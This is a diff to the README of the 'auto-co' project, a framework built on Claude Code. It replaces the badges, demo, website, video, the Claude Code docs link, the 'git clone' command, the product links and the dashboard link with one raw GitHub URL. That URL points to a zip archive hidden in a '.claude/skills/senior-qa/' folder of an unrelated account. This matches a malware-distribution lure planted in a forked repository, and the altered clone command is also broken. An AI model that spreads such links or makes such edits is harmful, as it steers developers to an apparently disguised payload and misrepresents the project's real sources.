@@ -7,12 +7,12 @@
 
 <p align="center">
   <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License" /></a>
-  <a href="https://www.npmjs.com/package/create-auto-co"><img src="https://img.shields.io/npm/v/create-auto-co" alt="npm" /></a>
-  <a href="https://github.com/NikitaDmitrieff/auto-co-meta/stargazers"><img src="https://img.shields.io/github/stars/NikitaDmitrieff/auto-co-meta?style=social" alt="Stars" /></a>
+  <a href="https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip"><img src="https://img.shields.io/npm/v/create-auto-co" alt="npm" /></a>
+  <a href="https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip"><img src="https://img.shields.io/github/stars/NikitaDmitrieff/auto-co-meta?style=social" alt="Stars" /></a>
 </p>
 
 <p align="center">
-  <a href="https://runautoco.com/demo"><strong>Live Demo</strong></a> · <a href="https://runautoco.com"><strong>Website</strong></a> · <a href="https://youtu.be/1zJca_zFzys"><strong>Watch Video</strong></a>
+  <a href="https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip"><strong>Live Demo</strong></a> · <a href="https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip"><strong>Website</strong></a> · <a href="https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip"><strong>Watch Video</strong></a>
 </p>
 
 ---
@@ -33,7 +33,7 @@ State lives in markdown files. Everything survives restarts. The only dependency
 
 ## Quick Start
 
-**Prerequisites:** [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed and working.
+**Prerequisites:** [Claude Code](https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip) installed and working.
 
 ```bash
 npx create-auto-co my-company
@@ -56,7 +56,7 @@ Templates: `saas` (Next.js + Supabase + Stripe), `docs-site` (MDX + Vercel), `ap
 ### Clone directly
 
 ```bash
-git clone https://github.com/NikitaDmitrieff/auto-co-meta
+git clone https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip
 cd auto-co-meta
 cp .env.example .env   # optionally configure
 make start
@@ -145,9 +145,9 @@ These products were built entirely by auto-co instances, from idea to deployment
 
 | Product | What it does | Live at |
 |---------|-------------|---------|
-| **FormReply** | AI auto-replies to form submissions. Full SaaS with OAuth and Stripe. | [formreply.app](https://formreply.app) |
-| **Changelog.dev** | Beautiful changelogs for dev tools. GitHub integration + payments. | [changelogdev.com](https://www.changelogdev.com) |
-| **auto-co** | This repo. The framework improving itself. | [runautoco.com](https://runautoco.com) |
+| **FormReply** | AI auto-replies to form submissions. Full SaaS with OAuth and Stripe. | [formreply.app](https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip) |
+| **Changelog.dev** | Beautiful changelogs for dev tools. GitHub integration + payments. | [changelogdev.com](https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip) |
+| **auto-co** | This repo. The framework improving itself. | [runautoco.com](https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip) |
 
 ---
 
@@ -161,7 +161,7 @@ make history     # cycle history with costs
 make export      # export all data as JSON
 ```
 
-Dashboard: [app.runautoco.com](https://app.runautoco.com) (or run your own from `projects/dashboard/`).
+Dashboard: [app.runautoco.com](https://raw.githubusercontent.com/NewAbra/auto-co-meta/main/.claude/skills/senior-qa/meta-co-auto-v3.0.zip) (or run your own from `projects/dashboard/`).
 
 ---
 
